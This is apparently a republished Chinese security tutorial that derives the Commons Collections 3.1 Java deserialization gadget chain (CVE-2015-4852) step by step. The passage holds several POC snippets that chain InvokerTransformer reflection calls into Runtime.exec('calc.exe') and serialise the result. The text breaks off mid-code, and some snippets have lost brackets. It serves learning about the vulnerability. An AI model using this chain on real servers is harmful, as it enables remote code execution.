<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>JAVA反序列化 - commons-collections - 1 | 极客快訊</title><meta property="og:title" content="JAVA反序列化 - commons-collections - 1 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><meta property="article:published_time" content="2020-11-14T21:03:08+08:00"><meta property="article:modified_time" content="2020-11-14T21:03:08+08:00"><meta name=Keywords content><meta name=description content="JAVA反序列化 - commons-collections - 1"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/a6b9d78d.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>JAVA反序列化 - commons-collections - 1</h1></header><date class="post-meta meta-date">2020-11-14</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>以下文章來源於雷神眾測 ，作者lala</p><p><strong>No.1聲明</strong></p><p>由於傳播、利用此文所提供的信息而造成的任何直接或者間接的後果及損失，均由使用者本人負責，雷神眾測以及文章作者不為此承擔任何責任。雷神眾測擁有對此文章的修改和解釋權。如欲轉載或傳播此文章，必須保證此文章的完整性，包括版權聲明等全部內容。未經雷神眾測允許，不得任意修改或者增減此文章內容，不得以任何方式將其用於商業目的。</p><p><strong>No.2前言</strong></p><p>這是個人學習java反序列化的第一篇利用鏈的文章，就好像P牛說的不知道為什麼網上講到java反序列化學習，上來就是cc鏈，你知道這個鏈它有多複雜麼.jpg。萌新也是理所當然的踩了這個坑，然後…..在一路質疑自己智商和"我不服"的情況下趟了過去。</p><p>路難行，難行，總歸要走。</p><p>走來，回望去，呵，牛逼。</p><p>在此文中是以一個只瞭解java反射機制和反序列化利用點（readObject）的視角去一點點復現推導了commons-collections、jdk1.7的poc的構造。</p><p>同時記錄下了一個個踩的坑，再爬出來，再跳進去，再爬出來的歷程。</p><p>如果你具備了反射機制和反序列化基本原理的知識，同時想學習cc鏈的話，個人感覺是這篇文是再適合不過了。</p><p>那麼開始。</p><p>瞭解反射機制的話，我們會發現若存在一個固有的反射機制時，輸入可控，就可能形成任意函數調用的情況，具有極大的危害。但實際上真的有存在這種情況：這就是commons-collections-3.1 jar包，cve編號：cve-2015-4852</p><p>在開始之前我們需要理一下反序列化漏洞的攻擊流程：</p><ol start=1><li>客戶端構造payload(有效載荷)，並進行一層層的封裝，完成最後的exp（exploit-利用代碼）</li><li>exp發送到服務端，進入一個服務端自主複寫（也可能是也有組件複寫）的readobject函數，它會反序列化恢復我們構造的exp去形成一個惡意的數據格式exp_1（剝去第一層）</li><li>這個惡意數據exp_1在接下來的處理流程(可能是在自主複寫的readobject中、也可能是在外面的邏輯中)，會執行一個exp_1這個惡意數據類的一個方法，在方法中會根據exp_1的內容進行函處理，從而一層層地剝去（或者說變形、解析）我們exp_1變成exp_2、exp_3……</li><li>最後在一個可執行任意命令的函數中執行最後的payload，完成遠程代碼執行。</li></ol><p>那麼以上大概可以分成三個主要部分：</p><ol start=1><li>payload：需要讓服務端執行的語句：比如說彈計算器還是執行遠程訪問等；我把它稱為：payload</li><li>反序列化利用鏈：服務端中存在的反序列化利用鏈，會一層層撥開我們的exp，最後執行payload。(在此篇中就是commons-collections利用鏈)</li><li>readObject複寫利用點：服務端中存在的可以與我們漏洞鏈相接的並且可以從外部訪問的readObject函數複寫點；我把它稱為readObject複寫利用點（自創名稱…）</li></ol><p><strong>No.3commons-collections-3.1</strong></p><p>首先來看看commons-collections項目吧官網第一段：</p><p>Java commons-collections是JDK 1.2中的一個主要新增部分。它添加了許多強大的數據結構，可以加速大多數重要Java應用程序的開發。從那時起，它已經成為Java中公認的集合處理標準。</p><p>Apache Commons Collections是一個擴展了Java標準庫裡的Collection結構的第三方基礎庫，它提供了很多強有力的數據結構類型並且實現了各種集合工具類。作為Apache開源項目的重要組件，Commons Collections被廣泛應用於各種Java應用的開發。它是一個基礎數據結構包，同時封裝了很多功能，其中我們需要關注一個功能：</p><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>轉化裝飾器：修改每一個添加到collection中的object</li></ul><p>Commons Collections實現了一個TransformedMap類，該類是對Java標準數據結構Map接口的一個擴展。該類可以在一個元素被加入到集合內時，自動對該元素進行特定的修飾變換，具體的變換邏輯由Transformer類定義，Transformer在TransformedMap實例化時作為參數傳入。org.apache.commons.collections.Transformer這個類可以滿足固定的類型轉化需求，其轉化函數可以自定義實現，我們的漏洞觸發函數就是在於這個點。</p><p>漏洞復現需要下載3.1版本,進去尋覓一下源碼和jar包都有。</p><p>由於沒有找到漏洞版本3.1的api說明，我們可以參考3.2.2的api文檔</p><p><strong>No.4POC->利用鏈</strong></p><p>我們將通過調試POC得到漏洞利用鏈的調用棧，順便介紹一下各個類，再通過分析調用棧的函數，反推出POC來探究其中的利用原理。</p><p>我們先看一下網上的POC代碼，如下：</p><p>import org.apache.commons.collections.*;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class commons_collections_3_1 { public static void main(String args) throws Exception { //此處構建了一個transformers的數組，在其中構建了任意函數執行的核心代碼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //將transformers數組存入ChaniedTransformer這個繼承類Transformer transformerChain = new ChainedTransformer(transformers); //創建Map並綁定transformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //給予map數據轉化鏈Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //觸發漏洞Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next; //outerMap後一串東西，其實就是獲取這個map的第一個鍵值對（value,value）；然後轉化成Map.Entry形式，這是map的鍵值對數據格式onlyElement.setValue("foobar");}}</p><p>好好看代碼的同學肯定會意識到，以上的poc其實只包括我總結三要素的payload和反序列化利用鏈兩者。而關鍵的readObject複寫利用點沒有包含在內。事實確實如此。這個poc的複寫利用點是sun.reflect.annotation.AnnotationInvocationHandler的readObject，但是我們先精簡代碼關注payload和利用鏈，最後再加上readObject複寫點。</p><p>調試以上POC，得到兩種調用棧：</p><p><strong>漏洞鏈</strong></p><p>Map.Entry其實就是鍵值對的數據格式，其setValue函數如下AbstracInputCheckedMapDecorator.class</p><p>public Object setValue(Object value) {value = this.parent.checkSetValue(value);//進入此處return super.entry.setValue(value);}</p><p>TransformedMap是一種重寫map類型的set函數和Map.Entry類型的setValue函數去調用轉換鏈的Map類型。TransformedMap.class</p><p>protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value);//進入此處}</p><p>由於TransformedMap具有commons_collections的轉變特性，當賦值一個鍵值對的時候會自動對輸入值進行預設的Transformer的調用。</p><p>ChainedTransformer.class：這裡有一個</p><p>public Object transform(Object object) { for(int i = 0; i &lt; this.iTransformers.length; ++i) { //循環進入此處，先進入1次ConstantTransformer.class，再3次InvokerTransformer.classobject = this.iTransformers[i].transform(object); //另外需要注意在數組的循環中，前一次transform函數的返回值，會作為下一次transform函數的object參數輸入。} return object;}</p><p>transform函數是一個接口函數，在上面的循環中進入了不同的函數。先是1次ConstantTransformer.class</p><p>public Object transform(Object input) { return this.iConstant;}</p><p>再是進入了InvokerTransformer.class，看到這個就會發現有點東西了。</p><p>public Object transform(Object input) { if (input == null) { return null;} else { try { //獲取input對象的classClass cls = input.getClass; //根據iMethodName、iParamTypes選擇cls中的一個方法Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //根據iArgs參數調用這個方法return method.invoke(input, this.iArgs);} catch (NoSuchMethodException var5) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' does not exist");} catch (IllegalAccessException var6) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' cannot be accessed");} catch (InvocationTargetException var7) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' threw an exception", var7);}}}}</p><p>明顯的反射機制，可見InvokerTransformer就是我們的觸發任意代碼執行處，我們看看源碼中的文件描述：先看看我們需要關注的InvokerTransformer類的描述（在jar包中是找不到描述信息的，可以通過下載官方源碼得到）：</p><p>/*** Transformer implementation that creates a new object instance by reflection.*通過反射機制創建一個新的對象實例的轉換器實現</p><p>我們可以這裡有經典的反射機制調用，在細節分析前我們先整理一下調用棧，但不需要很理解。</p><p>Map.Entry 類型setValue("foobar")=> AbstracInputCheckedMapDecorator.setValue=> TransformedMap.checkSetValue=> ChainedTransformer.transform(Object object)根據數組，先進入 => ConstantTransformer.transform(Object input)再進入 => InvokerTransformer.transform(Object input)</p><p><strong>No.5重構POC</strong></p><p>首先明確我們的最終目的是為了執行語句Runtime.getRuntime.exec("calc.exe");</p><ul><li>Runtime.getRuntime：獲取一個Runtime的實例</li><li>exec：調用實例的exec函數</li></ul><p>因為漏洞函數最後是通過反射機制調用任意這個語句先轉化成反射機制如下（後面需要用到）：</p><p>至於如何構造反射機制的語句，參考往期文章java反射機制</p><p>Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此處在獲取實例,"calc.exe")</p><p><strong>第一步 InvokerTransformer</strong></p><p>再回看反射機制觸發函數InvokerTransformer類的transform(Object input)（做了簡化處理，只留取重點部分）：</p><p>public Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);</p><p>通過構造的反射機制以及以上代碼進行填空，可以得出當變量等於以下值時，可形成命令執行：</p><p>Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));this.iMethodName="exec"this.iParamTypes=String.classthis.iArgs="calc.exe"</p><p>那麼在InvokerTransformer類源碼中我們可以找到賦值this.iMethodName,this.iParamTypes,this.iArgs的構造函數:</p><p>public InvokerTransformer(String methodName, Class paramTypes, Object args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;}</p><p>我們就可以構建以下測試代碼直接調用InvokerTransformer通過反射執行任意命令：下面開始試一下：</p><p>public static void main(String args) throws Exception { //通過構造函數，輸入對應格式的參數，對iMethodName、iParamTypes、iArgs進行賦值InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"}); //構造inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //執行a.transform(input);}</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8><p class=pgc-img-caption></p></div><p><strong>在第二步之前</strong></p><p>彈出了計算器！好像很厲害的樣子！然後我們來模擬一下利用場景：</p><ul><li>為了方便，攻擊者受害者寫在同一函數中</li><li>使用文件寫入，代替網絡傳輸</li></ul><p>由於InvokerTransformer繼承了Serializable類，是可以成功序列化的</p><p>public static void main(String args) throws Exception { //模擬攻擊//1.客戶端構造序列化payload，使用寫入文件模擬發包攻擊InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(a); //2.服務端從文件中讀取payload模擬接受包，然後觸發漏洞//服務端反序列化payload讀取FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //神奇第一處：服務端需要自主構造惡意inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //神奇第二處：服務端需要將客戶端輸入反序列化成InvokerTransformer格式，並在服務端自主傳入惡意參數inputInvokerTransformer a_in = (InvokerTransformer) fin.readObject;a_in.transform(input);}</p><p>我們會發現如果我們要直接利用這個反射機制作為漏洞的話，需要服務端的開發人員：</p><ol start=1><li>幫我們寫一個payload作為input；</li><li>接受客戶端輸入參數，反序列化成InvokerTransformer類</li><li>再刻意調用InvokerTransformer類的transform函數</li></ol><p>實際上…..只有開發人員是自己人的情況下才滿足條件吧……所以我們面臨一些問題：</p><ol start=1><li>payload肯定需要在客戶端可以自定義構造，再傳輸進入服務端</li><li>服務端需要把我們的輸入exp反序列化成一個在代碼中可能使用到的類</li><li>並且在代碼正常操作中會調用這個類中的一個可觸發漏洞地函數（當然這個函數最後會進入我們InvokerTransformer類的transform函數，從而形成命令執行）</li><li>如果這個反序列化的類和這個類觸發命令執行的方法可以在一個readObject複寫函數中恰好觸發，就對於服務端上下文語句沒有要求了！</li></ol><p>這邊假如像預期這樣，是對服務端上下文沒有要求，因為只要執行readObject就肯定會命令執行，不需要其他上下文條件。</p><p>但是對於服務端版本環境是有要求的，之後會說到</p><p>那麼我們一個個來解決問題：首先使客戶端自定義paylaod！</p><p><strong>第二步 ChainedTransformer</strong></p><p>下面我們需要關注ChainedTransformer這個類,首先看一下這個類的描述：</p><p>/*** Transformer implementation that chains the specified transformers together.* &lt;p>* The input object is passed to the first transformer. The transformed result* is passed to the second transformer and so on.*將指定的轉換器連接在一起的轉化器實現。輸入的對象將被傳遞到第一個轉化器，轉換結果將會輸入到第二個轉化器，並以此類推</p><p>可以知道他會把我們的Transformer變成一個串，再逐一執行，其中這個操作對應的就是ChainedTransformer類的transform函數</p><p>/*** Transforms the input to result via each decorated transformer** @param object the input object passed to the first transformer* @return the transformed result*/public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) {object = iTransformers[i].transform(object);} return object;}</p><p>這裡會遍歷iTransformers數組，依次調用這個數組中每一個Transformer的transform，並串行傳遞執行結果。</p><p>首先確定iTransformers可控，iTransformers數組是通過ChainedTransformer類的構造函數賦值的：</p><p>/*** Constructor that performs no validation.* Use &lt;code>getInstance&lt;/code> if you want that.** @param transformers the transformers to chain, not copied, no nulls*/public ChainedTransformer(Transformer transformers) { super;//這個super不清楚做了啥，iTransformers = transformers;}</p><p>那麼我們知道可以自定義iTransformers的內容，我們已有條件如下：</p><p>//最終執行目標Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此處在獲取實例, "calc.exe") //InvokeTransformer關鍵語句：public Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>再看到InvokeTransformer代碼我們需要引出一個注意點：</p><p>這裡我們需要注意到input.getClass這個方法使用上的一些區別：</p><ul><li>當input是一個類的實例對象時，獲取到的是這個類</li><li>當input是一個類時，獲取到的是java.lang.Class</li></ul><p>可以使用如下代碼驗證，這裡不再贅述</p><p>Object a = Runtime.getRuntime;Class b = Runtime.class;System.out.println(a.getClass);System.out.println(b.getClass); //結果//class java.lang.Runtime//class java.lang.Class</p><p>基於之前寫的代碼：</p><p>//只調用InvokeTransformer的情況如下：InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));</p><p>我們也可以知道input的為Runtime類的對象，所以cls就是Runtime類，所以cls.getMethod可以找到exec方法，直接進行調用。</p><p>先把a封裝成ChainedTransformer格式，但是payload還是在外面</p><p>//客戶端構造payloadTransformer transformers = new Transformer { new InvokerTransformer("exec",new Class{String.class},new String{"calc.exe"});}Transformer transformerChain = new ChainedTransformer(transformers); //服務端觸發所需內容Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));transformerChain.transform(input);//此處必須為input，作為第一個輸入</p><p>把payload放入Transformer數組中，需要轉化成特定的Transformer格式才行。</p><p><strong>第二點五步 ConstantTransformer -> Runtime實例序列化</strong></p><p>我們找到ConstantTransformer類跟InvokkerTransformer一樣繼承Transforme父類，可以進入數組顧名思義ConstantTransformer類其實就只會存放一個常量；它的構造函數會寫入這個變量，他的transform函數會返回這個變量。把Runtime實例寫入這個變量：</p><p>Transformer transformers = new Transformer { //以下兩個語句等同,一個是通過反射機制得到，一個是直接調用得到Runtime實例// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),new ConstantTransformer(Runtime.getRuntime), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);//此處輸入可以為任意值，因為不會被使用到，相當於初始第一個輸入為我們設置的常量</p><p>以上代碼可以成功彈框執行！那麼我們模擬一下序列化與反序列化過程！</p><p>//客戶端構造payloadTransformer transformers = new Transformer { new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers); //payload序列化寫入文件，模擬網絡傳輸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //服務端反序列化payload讀取FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服務端反序列化成ChainedTransformer格式，並在服務端自主傳入惡意參數inputTransformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);</p><p>但是很遺憾的告訴以為快要成功的你，成功的本地測試加上序列化、反序列化過程之後就會失敗。因為Runtime類的定義沒有繼承Serializable類，所以是不支持反序列化的。</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a692eb7772c1477f83a9626dd41407bf><p class=pgc-img-caption></p></div><p>那麼我們在payload寫入Runtime實例的計劃就泡湯了。</p><p><strong>第二點八步 在服務端生成Runtime實例</strong></p><p>既然我們沒法在客戶端序列化寫入Runtime的實例，那就讓服務端執行我們的命令生成一個Runtime實例唄？我們知道Runtime的實例是通過Runtime.getRuntime來獲取的，而InvokerTransformer裡面的反射機制可以執行任意函數。同時，我們已經成功執行過Runtime類裡面的exec函數。講道理肯定是沒問題的.</p><p>我們先看getRuntiime方法的參數</p><p>public static Runtime getRuntime { return currentRuntime;}</p><p>沒有參數，那就非常簡單了</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class),//得到Runtime class//由於InvokerTransformer的構造函數要求傳入Class類型的參數類型，和Object類型的參數數值，所以封裝一下，下面也一樣//上面傳入Runtime.class，調用Runtime class的getRuntime方法（由於是一個靜態方法，invoke調用靜態方法，傳入類即可）new InvokerTransformer("getRuntime",new Class{},new Object{}), //上面Runtime.getRuntime得到了實例，作為這邊的輸入(invoke調用普通方法，需要傳入類的實例)new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);</p><p>在這裡，之前自己陷入了一個很傻逼的問題，即：InvokerTransformer類transform方法中return method.invoke這個語句invoke調用到底return了啥?因為在這裡形成了一個調用return的結果，再調用的鏈。為什麼就可以上一個輸出作為下一個輸入時，可以成功調用了呢？一開始以為invoke會統一返回一個對象作為下一個輸入什麼的，並且在調試的時候每次invoke的結果都不一樣，源碼看的頭暈。實際上是鑽了死衚衕：invoke的return是根據被調用的函數return啥，invoke就return啥。就好比我invoke一個我自定義的方法a，在a中，我return了字符串"1"。那麼就是invoke的結果就是字符串"1"。看以上的過程就是第一次Runtime.getRuntime的結果輸入了下一個InvokerTransformer</p><p>以上感覺是萬事大吉了！但是實際上並不是…</p><p>回想之前對於InvokerTransformer中Class cls = input.getClass;的解釋</p><ul><li>這裡我們需要注意到input.getClass這個方法使用上的一些區別：</li><li>當input是一個類的實例對象時，獲取到的是這個類</li></ul><p>當input是一個類時，獲取到的是java.lang.Class</p><p>我們來推演第一次InvokerTransformer的反射調用，即得到Runtime類對象的getRuntime方法調用:</p><p>//InvokeTransformer關鍵語句：public Object transform(Object input) {//input為我們設置的常量Runtime.classClass cls = input.getClass;//！！！這裡由於input是一個類，會得到java.lang.Class//在java.lang.Class類中去尋找getRuntime方法企圖得到Runtime類對象，此處報錯！！Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>那麼我們好像陷入了一個死衚衕：得到Runtime類實例才能調用exec方法。而得到Runtime類實例作為input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime類實例………</p><p>…………………非常的尷尬…………………..</p><p><strong>第二點九步 還是反射機制</strong></p><p>那麼我們通過直接調用Runtime.getRuntime方法好像是行不通了,有沒有其他方法呢？</p><p><strong>還是反射機制</strong></p><p>已知：</p><ol start=1><li>我們開頭不能獲得Class.forName("java.lang.Runtime")，只能得到Class.forName("java.lang.Class")</li><li>我們可以有任意的反射機制求：</li><li>我們要獲取到Runtime.getRunime函數，並執行它。解：</li><li>通過反射機制獲取反射機制中的getMethod類，由於getMethod類是存在Class類中，就符合開頭Class類的限制</li><li>通過getMethod函數獲取Runtime類中的getRuntime函數</li><li>在哪個類中調用getMethod去獲取方法，實際上是由invoke函數裡面的的第一個參數obj決定的</li><li>再通過反射機制獲取反射機制中的invoke類，執行上面獲取的getRuntime函數</li><li>invoke調用getRuntime函數，獲取Runtime類的實例這裡在使用反射機制調用getRuntime靜態類時，invoke裡面第一個參數obj其實可以任意改為null，或者其他類，而不一定要是Runtime類</li></ol><p>具體變化細節，我選擇把它放在反射機制一文中說明，這邊給出結果。</p><p>我們的最終目的是執行Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")</p><p>先來獲取getRuntime類</p><p>//目標語句Class.forName("java.lang.Runtime").getMethod("getRuntime")//使用java.lang.Class開頭Class.forName("java.lang.Class").getMethod("getMethod", new Class {String.class, Class.class }).invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]); //invoke函數的第一個參數是Runtime類，我們需要在Runtime類中去執行getMethod，獲取getRuntime參數</p><p>對照著InvokerTransformer類轉變為transformers格式</p><p>Class cls = input.getClass;//cls = java.lang.ClassMethod method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，並返回這個方法</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), //還需要填充 調用getRuntime得到Runtime實例,new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>還差執行獲取到的getRuntime，下一個input是上一個執行接口，繼續對照</p><p>//input=getRuntime這個方法Class cls = input.getClass;//cls = java.lang.Method（getRuntime方法是method類）Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method類中找到invoke方法，method=invoke方法return method.invoke(input, this.iArgs); //調用invoke方法，input=getRuntime這個方法，傳入自定義的參數</p><p>以上最後一步有點複雜，method就是invoke方法，相當於使用invoke調用了invoke函數。首先this.iMethodName, this.iParamTypes是根據invoke接口而定的：</p><p>public Object invoke(Object obj, Object... args)//this.iMethodName="invoke"//this.iParamTypes=new Class {Object.class, Object.class }//外面class、Object封裝是InvokerTransformer類的構造函數要求</p><p>按照invoke中的input才是它要調用的環境的準則。invoke方法.invoke(input, this.iArgs)實際上等於input.invoke(this.iArgs)，而input=getRuntime方法，那麼只要填入this.iArgs就好了</p><p>又由於getRuntime是個靜態函數，不用太糾結輸入obj，寫作null。getRuntime方法不需要參數。this.iArgs=null,new Object[0]</p><p>那麼整合就如下：</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>以上代碼其實就是等同於((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec("calc.exe");我們籠統的來理解，實際就是如下（這裡偷一張orleven的圖）：</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/399744f6d7d94c5bb840de05422a8d70><p class=pgc-img-caption></p></div><p>總體上來說：利用了反射機制調用反射機制的函數，繞過了開頭cls只能為java.lang.Class的限制，根據具體環境input環環相扣，特麼竟然恰好就通了….非常的微妙….</p><p><strong>第三步 TransformedMap</strong></p><p>那麼我們在第二步通過ConstantTransformer、ChainedTransformer就完成了payload在客戶端自定義這一目標，我們看一下目前的攻擊流程</p><p>public class commons_collections_3_1 { public static void main(String args) throws Exception { //1.客戶端構建攻擊代碼//此處構建了一個transformers的數組，在其中構建了任意函數執行的核心代碼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //將transformers數組存入ChaniedTransformer這個繼承類Transformer transformerChain = new ChainedTransformer(transformers); //payload序列化寫入文件，模擬網絡傳輸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //2.服務端讀取文件，反序列化，模擬網絡傳輸FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服務端反序列化成ChainedTransformer格式，再調用transform函數Transformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);}}</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24822ba4d14747858166a8c065c96838><p class=pgc-img-caption></p></div><p>完成命令執行服務端執行如下操作：</p><ol start=1><li>服務端反序列化我們的輸入成ChainedTransformer類型</li><li>調用這個輸入的transform函數</li></ol><p>轉變的類型是一個數據轉化鏈數據格式，很明顯服務端不可能存在這種代碼，利用價值不足，接下來我們需要繼續延長這個漏洞鏈。</p><p><strong>封裝成Map</strong></p><p>由於我們得到的是ChainedTransformer，一個轉換鏈，TransformedMap類提供將map和轉換鏈綁定的構造函數，只需要添加數據至map中就會自動調用這個轉換鏈執行payload。</p><p>這樣我們就可以把觸發條件從顯性的調用轉換鏈的transform函數延伸到修改map的值。很明顯後者是一個常規操作，極有可能被觸發。</p><p>TransformedMap</p><p>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);}</p><p>try一下：</p><p>public static void main(String args) throws Exception { //1.客戶端構建攻擊代碼//此處構建了一個transformers的數組，在其中構建了任意函數執行的核心代碼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class 